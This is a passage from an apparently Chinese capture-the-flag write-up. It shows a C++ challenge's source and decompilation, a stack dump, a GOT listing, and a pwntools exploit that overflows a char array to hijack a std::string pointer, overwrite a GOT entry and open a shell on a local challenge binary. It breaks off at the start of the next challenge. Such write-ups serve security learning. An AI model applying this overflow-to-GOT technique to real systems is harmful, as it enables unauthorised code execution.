class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>: <span class=\"comment\">// set str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;str: &quot;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; test.str();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>: <span class=\"comment\">// get str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;str: &quot;</span> &lt;&lt; test.str() &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">default</span>: <span class=\"comment\">// otherwise exit</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;bye!&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对照 ida 来看<br>\n定义的函数连函数指针都没放在结构体力 只有 string 的指针和 char 这个字符数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v12; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v13; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v14; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v16; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v17; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v18; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v19; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> choice; <span class=\"comment\">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> test[<span class=\"number\">72</span>]; <span class=\"comment\">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v23; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v23 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  Test::Test((Test *)test);                     <span class=\"comment\">// 创建一个对象</span></span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  v3 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;1. set c_str&quot;</span>);</span><br><span class=\"line\">  v4 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v5 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v4, <span class=\"string\">&quot;2. get c_str&quot;</span>);</span><br><span class=\"line\">  v6 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v5, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v7 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v6, <span class=\"string\">&quot;3. set str&quot;</span>);</span><br><span class=\"line\">  v8 = <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v7, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  v9 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v8, <span class=\"string\">&quot;4. get str&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v9, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( (<span class=\"type\">unsigned</span> __int8)<span class=\"built_in\">std</span>::ios::good(&amp;unk_404230) )<span class=\"comment\">// ctrl + d exit good</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    choice = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::istream::operator&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, &amp;choice);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( choice == <span class=\"number\">4</span> )                          <span class=\"comment\">// std::cout &lt;&lt; &quot;str: &quot; &lt;&lt; test.str() &lt;&lt; std::endl;</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v15 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;str: &quot;</span>);</span><br><span class=\"line\">      v16 = Test::str[abi:cxx11](test);         <span class=\"comment\">// [1] &lt;&lt;- 其实就是返回一个地址</span></span><br><span class=\"line\">      v17 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"type\">char</span>&gt;(v15, v16);</span><br><span class=\"line\">      <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v17, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( choice &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> ( choice )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;str: &quot;;</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;str: &quot;</span>);</span><br><span class=\"line\">          v14 = Test::str[abi:cxx11](test);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&gt;&gt;&lt;<span class=\"type\">char</span>&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, v14);<span class=\"comment\">// std::cin &gt;&gt; test.str();</span></span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;c_str: &quot;;</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;c_str: &quot;</span>);</span><br><span class=\"line\">          v10 = Test::c_str((Test *)test);      <span class=\"comment\">// return this</span></span><br><span class=\"line\">          <span class=\"built_in\">std</span>::operator&gt;&gt;&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>, v10);<span class=\"comment\">// std::cin &gt;&gt; test.c_str();</span></span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:                                 <span class=\"comment\">// std::cout &lt;&lt; &quot;c_str: &quot; &lt;&lt; test.c_str() &lt;&lt; std::endl;</span></span><br><span class=\"line\">          v11 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;c_str: &quot;</span>);</span><br><span class=\"line\">          v12 = Test::c_str((Test *)test);</span><br><span class=\"line\">          v13 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(v11, v12);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v13, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">          v18 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;bye!&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v18, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">          v19 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_15;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v19 = <span class=\"number\">1</span>;</span><br><span class=\"line\">LABEL_15:</span><br><span class=\"line\">  Test::~Test((Test *)test);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v19;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输入 0x1f 个 A 到 char 里和 0x8 个到 string 里<br>\n可以看到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x007fff9d71f280</span>│+<span class=\"number\">0x0000</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f288</span>│+<span class=\"number\">0x0008</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f290</span>│+<span class=\"number\">0x0010</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f298</span>│+<span class=\"number\">0x0018</span>: <span class=\"number\">0x41414141414141</span> (<span class=\"string\">&quot;AAAAAAA&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2a0</span>│+<span class=\"number\">0x0020</span>: <span class=\"number\">0x007fff9d71f2b0</span>  →  <span class=\"string\">&quot;BBBBBBBB&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2a8</span>│+<span class=\"number\">0x0028</span>: <span class=\"number\">0x0000000000000008</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2b0</span>│+<span class=\"number\">0x0030</span>: <span class=\"string\">&quot;BBBBBBBB&quot;</span></span><br></pre></td></tr></table></figure>\n<p>string 第一个是指针 指向堆上<br>\n我们可以劫持这个指针来进行任意写 具体原因如下</p>\n<blockquote>\n<p><code>string</code>  は「文字列を格納するアドレス (8bytes), 長さ (8bytes), 文字列 (短ければここに、長ければ heap 上に)」<br>\nという構造をしています。なので「文字列を格納するアドレス」を  <code>test.c_str()</code>  のオーバーフローで<br>\n書き換えれば GOT に任意書き込みができます。これで  <code>call_me</code>  を呼べるようにします。</p>\n</blockquote>\n<p>至于最后一个难题就是选择 got 表了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x404018</span> &lt;_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@got.plt&gt;: <span class=\"number\">0x0000000000401030</span>      <span class=\"number\">0x00007ffff7ee5d70</span></span><br><span class=\"line\"><span class=\"number\">0x404028</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@got.plt&gt;:   <span class=\"number\">0x0000000000401050</span>      <span class=\"number\">0x0000000000401060</span></span><br><span class=\"line\"><span class=\"number\">0x404038</span> &lt;__cxa_atexit@got.plt&gt;:        <span class=\"number\">0x00007ffff7c07de0</span>      <span class=\"number\">0x0000000000401080</span></span><br><span class=\"line\"><span class=\"number\">0x404048</span> &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt&gt;:     <span class=\"number\">0x00007ffff7f01bb0</span>      <span class=\"number\">0x00007ffff7f006d0</span></span><br><span class=\"line\"><span class=\"number\">0x404058</span> &lt;__stack_chk_fail@got.plt&gt;:    <span class=\"number\">0x00000000004010b0</span>      <span class=\"number\">0x00000000004010c0</span></span><br><span class=\"line\"><span class=\"number\">0x404068</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@got.plt&gt;:   <span class=\"number\">0x00007ffff7f114b0</span>      <span class=\"number\">0x00007ffff7c4cad0</span></span><br><span class=\"line\"><span class=\"number\">0x404078</span> &lt;_ZNSt8ios_base4InitC1Ev@got.plt&gt;:     <span class=\"number\">0x00007ffff7e890f0</span>      <span class=\"number\">0x00007ffff7ee2bb0</span></span><br><span class=\"line\"><span class=\"number\">0x404088</span> &lt;_Unwind_Resume@got.plt&gt;:      <span class=\"number\">0x0000000000401110</span>      <span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>个人最开始是写 <code>__stack_chk_fail</code>  的 然后想着用 pwntools 的 shutdown<br>\n 但是析构的时候会 free 掉 string 导致系统提前崩<br>\n所以按 wp 就是改 <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code>  了<br>\n具体可能是试一个个出来的</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">ri      = <span class=\"keyword\">lambda</span>                    :raw_input()</span><br><span class=\"line\">ps      = <span class=\"keyword\">lambda</span>                    :pause()</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">struct Test &#123;</span></span><br><span class=\"line\"><span class=\"string\">\tchar _c_str[0x20];</span></span><br><span class=\"line\"><span class=\"string\">\tstd::string _str;</span></span><br><span class=\"line\"><span class=\"string\">&#125;;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_c_str</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;c_str: &quot;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_c_str</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_str</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;str: &quot;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_str</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># b *0x4013E6</span></span><br><span class=\"line\">got = <span class=\"number\">0x404048</span> <span class=\"comment\"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x4016DE</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tset_c_str(<span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x20</span> + p64(got))</span><br><span class=\"line\">\tset_str(p64(binsh))</span><br><span class=\"line\">\tir()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<h1 id=\"smal_arey\"><a class=\"markdownIt-Anchor\" href=\"#smal_arey\">#</a> smal_arey</h1>\n<p>只开了 NX</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">long</span> size, index, *arr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;size) != <span class=\"number\">1</span> || size &lt; <span class=\"number\">0</span> || size &gt; <span class=\"number\">5</span>)<span class=\"comment\">// 1 2 3 4</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  arr = ARRAY_NEW(size);                   [<span class=\"number\">1</span>] &lt;&lt;- 在栈上申请 n + <span class=\"number\">1</span> 个size</span><br><span class=\"line\">  <span class=\"title function_\">while</span> <span class=\"params\">(<span class=\"number\">1</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;index) != <span class=\"number\">1</span> || index &lt; <span class=\"number\">0</span> || index &gt;= size)</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;value: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;arr[index]);             [<span class=\"number\">2</span>] &lt;&lt;- 在size范围内进行任意四字节的读写</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__attribute__((constructor))</span><br><span class=\"line\"><span 